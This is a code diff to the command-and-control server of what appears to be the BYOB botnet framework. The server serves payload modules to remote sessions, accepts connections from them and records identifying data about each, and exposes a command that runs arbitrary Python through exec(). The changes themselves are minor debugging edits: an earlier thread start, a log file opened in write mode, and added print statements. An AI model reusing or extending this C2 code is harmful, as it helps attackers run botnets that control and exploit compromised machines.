@@ -79,7 +79,6 @@ class C2(threading.Thread):
                 'description': 'execute python code in current context with built-in exec() method'}
         }
         self._setup_server()
-        globals()['c2'] = self
 
     def _setup_server(self):
         # directory containing BYOB modules
@@ -99,7 +98,7 @@ class C2(threading.Thread):
             print("unable to locate directory containing user-installed packages")
             sys.exit(0)
 
-        tmp_file=open(".log","a")
+        tmp_file=open(".log","w")
 
         # don't run multiple instances
         try:
@@ -110,6 +109,9 @@ class C2(threading.Thread):
             # serve modules
             globals()['module_handler'] = subprocess.Popen('{0} -m {1} {2}'.format(sys.executable, http_serv_mod, self.port + 1), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=modules, shell=True)
             util.log("Serving BYOB modules from {0} on port {1}...".format(modules, self.port + 1))
+
+            globals()['c2'] = self
+            globals()['c2'].start()
         except Exception as e:
             print("server.C2 failed to launch package_handler and module_handler. Exception: " + str(e))
 
@@ -213,12 +215,13 @@ class C2(threading.Thread):
 
     @util.threaded
     def serve_until_stopped(self):
+        print('testing serve')
         while True:
             
             connection, address = self.socket.accept()
 
             session = SessionThread(connection=connection, c2=self)
-
+            print(session)
             if session.info != None:
 
                 # database stores identifying information about session
@@ -236,7 +239,7 @@ class C2(threading.Thread):
 
                 self.sessions[owner][session.info.get('uid')] = session
 
-                util.log('New session {}:{} connected'.format(owner, session.info.get('uid')))
+                print('New session {}:{} connected'.format(owner, session.info.get('uid')))
 
             else:
                 util.log("Failed Connection: {}".format(address[0]))
